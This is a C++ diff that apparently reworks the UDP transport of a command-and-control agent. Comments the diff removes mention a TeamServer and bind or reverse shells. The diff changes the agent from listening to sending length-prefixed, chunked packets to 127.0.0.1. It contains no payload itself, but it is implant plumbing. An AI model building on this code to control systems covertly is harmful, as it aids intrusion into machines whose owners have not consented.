@@ -52,18 +52,14 @@ BOOL ConnectorUDP::SetConfig(ProfileUDP profile, BYTE* beat, ULONG beatSize)
 	if (sock == -1)
 		return FALSE;
 
-	struct sockaddr_in saddr = { 0 };
-	saddr.sin_family = AF_INET;
-	saddr.sin_port = ((this->port >> 8) & 0x00FF) | ((this->port << 8) & 0xFF00); // port
-	saddr.sin_addr.s_addr = 0; // INADDR_ANY
-
-	if (this->functions->bind(sock, (struct sockaddr*)&saddr, sizeof(sockaddr)) == -1) {
-		this->functions->closesocket(sock);
-		return FALSE;
-	}
+	this->ServerAddrLen = sizeof(struct sockaddr_in);
+	memset(&this->ServerAddr, 0, this->ServerAddrLen);
+	this->ServerAddr.sin_family = AF_INET;
+	this->ServerAddr.sin_port = ((this->port >> 8) & 0x00FF) | ((this->port << 8) & 0xFF00);
+	this->ServerAddr.sin_addr.s_addr = 0x0100007F;
 
 	this->prepend = profile.prepend;
-	this->SrvSocket = sock;
+	this->ClientSocket = sock;
 	return TRUE;
 }
 
@@ -72,8 +68,25 @@ void ConnectorUDP::SendData(BYTE* data, ULONG data_size)
     this->recvSize = 0;
 
     if (data && data_size) {
-        // Send data directly without length header
-        this->functions->sendto(this->SrvSocket, (const char*)data, data_size, 0, (struct sockaddr*)&this->ClientAddr, this->ClientAddrLen);
+
+		if (this->functions->sendto(this->ClientSocket, (const char*)&data_size, 4, 0, (struct sockaddr*)&this->ServerAddr, this->ServerAddrLen) != -1) {
+			DWORD index = 0;
+			DWORD size = 0;
+			DWORD NumberOfBytesWritten = 0;
+			while (1) {
+				size = data_size - index;
+				if (data_size - index > 0x1000)
+					size = 0x1000;
+
+				NumberOfBytesWritten = this->functions->sendto(this->ClientSocket, (const char*)(data + index), size, 0, (struct sockaddr*)&this->ServerAddr, this->ServerAddrLen);
+				if (NumberOfBytesWritten == -1)
+					break;
+
+				index += NumberOfBytesWritten;
+				if (index >= data_size)
+					break;
+			}
+		}
     }
 
 	bool alive = false;
@@ -82,11 +95,19 @@ void ConnectorUDP::SendData(BYTE* data, ULONG data_size)
 
 		fd_set readfds;
 		readfds.fd_count = 1;
-		readfds.fd_array[0] = this->SrvSocket;
+		readfds.fd_array[0] = this->ClientSocket;
 		timeval timeout = { 0, 100 };
 
 		int selResult = this->functions->select(0, &readfds, NULL, NULL, &timeout);
-		if (selResult > 0) {
+		if (selResult == 0) {
+			alive = true;
+			break;
+		}
+
+		if (selResult == SOCKET_ERROR)
+			break;
+
+		if (this->functions->__WSAFDIsSet(this->ClientSocket, &readfds)) {
 			alive = true;
 			break;
 		}
@@ -98,24 +119,34 @@ void ConnectorUDP::SendData(BYTE* data, ULONG data_size)
 	}
 
     DWORD totalBytesAvail = 0;
-	int result = this->functions->ioctlsocket(this->SrvSocket, FIONREAD, &totalBytesAvail);
-    if (result != -1 && totalBytesAvail > 0) {
-        
-        if (totalBytesAvail > this->allocaSize) {
-             this->recvData   = (BYTE*)this->functions->LocalReAlloc(this->recvData, totalBytesAvail, 0);
-             this->allocaSize = totalBytesAvail;
-        }
+	int result = this->functions->ioctlsocket(this->ClientSocket, FIONREAD, &totalBytesAvail);
+    if (result != -1 && totalBytesAvail >= 4) {
 
+        ULONG dataLength = 0;
         int addrLen = sizeof(struct sockaddr_in);
-        // Read full packet
-        int bytesRead = this->functions->recvfrom(this->SrvSocket, (char*)this->recvData, this->allocaSize, 0, (struct sockaddr*)&this->ClientAddr, &addrLen);
-        
-        if (bytesRead != -1 && bytesRead > 0) {
-            this->ClientAddrLen = addrLen;
-            this->recvSize = bytesRead;
-        } else {
-            this->recvSize = -1;
-        }
+		if (this->functions->recvfrom(this->ClientSocket, (PCHAR)&dataLength, 4, 0, (struct sockaddr*)&this->ServerAddr, &addrLen) != -1 && dataLength) {
+
+            this->ServerAddrLen = addrLen;
+
+            if (dataLength > this->allocaSize) {
+                this->recvData   = (BYTE*)this->functions->LocalReAlloc(this->recvData, dataLength, 0);
+                this->allocaSize = dataLength;
+            }
+
+            ULONG index = 0;
+			int NumberOfBytesRead = 0;
+
+			while (index < dataLength) {
+                int bytesToRead = dataLength - index;
+				NumberOfBytesRead = this->functions->recvfrom(this->ClientSocket, (PCHAR)this->recvData + index, bytesToRead, 0, (struct sockaddr*)&this->ServerAddr, &addrLen);
+
+                if (NumberOfBytesRead == -1) break;
+                if (NumberOfBytesRead == 0) break;
+
+                index += NumberOfBytesRead;
+			}
+            this->recvSize = index;
+		}
     }
 }
 
@@ -141,49 +172,8 @@ void ConnectorUDP::RecvClear()
 
 void ConnectorUDP::Listen()
 {
-    // For UDP, just prepare buffer. Reception handled in SendData (Heartbeat) or separate loop?
-    // Listen in Agent usually waits for an initial command or just setups.
-    // In TCP it Accepts. In UDP there is no Accept.
-    // We just alloc buffer.
-
     this->recvData = (BYTE*)this->functions->LocalAlloc(LPTR, 0x100000);
     this->allocaSize = 0x100000;
-
-	fd_set readfds;
-	readfds.fd_count = 1;
-	readfds.fd_array[0] = this->SrvSocket;
-
-	// Wait for a packet to know we are connected? 
-	// Or just return? TCP Listen() accepts. 
-	// If we return, the main loop calls RecvData/SendData.
-	// But we need ClientAddr from somewhere if we are a "server" listener?
-	// Wait, this is the AGENT. 
-	// The Agent CONNECTS to the TeamServer (Listener).
-	// So Agent->Connect().
-	// But `ConnectorUDP.cpp` has `Listen`. 
-    // In `ConnectorTCP.cpp`, `Listen` calls separate `accept`. 
-    // Is this a Bind/Reverse shell or Reverse connection?
-    // ProfileUDP has `port`. 
-    // If it's a listener on the agent side (Bind), then we wait for TS to send us a packet.
-    // If it's Reverse, we should be sending first.
-    // The previous code did `select` then `recvfrom(PEEK)`.
-    // I will keep the logic: Wait for a packet to populate ClientAddr.
-
-	while (1) {
-		int sel = this->functions->select(0, &readfds, 0, 0, NULL);
-        // Check for readability
-		if (sel > 0 && (readfds.fd_array[0] == this->SrvSocket || this->functions->__WSAFDIsSet(this->SrvSocket, &readfds))) {
-            
-            char buf[1];
-            int addrLen = sizeof(struct sockaddr_in);
-            // PEEK to populate ClientAddr so we know where to reply
-            int res = this->functions->recvfrom(this->SrvSocket, buf, 1, MSG_PEEK, (struct sockaddr*)&this->ClientAddr, &addrLen);
-            if (res != -1) {
-                this->ClientAddrLen = addrLen;
-                break;
-            }
-		}
-	}
 }
 
 void ConnectorUDP::Disconnect()
@@ -196,12 +186,11 @@ void ConnectorUDP::Disconnect()
 
     this->allocaSize = 0;
     this->recvData = 0;
-    // UDP doesn't really disconnect, but we can reset
-    memset(&this->ClientAddr, 0, sizeof(this->ClientAddr));
-    this->ClientAddrLen = 0;
+    memset(&this->ServerAddr, 0, sizeof(this->ServerAddr));
+    this->ServerAddrLen = 0;
 }
 
 void ConnectorUDP::CloseConnector()
 {
-	this->functions->closesocket(this->SrvSocket);
+	this->functions->closesocket(this->ClientSocket);
 }
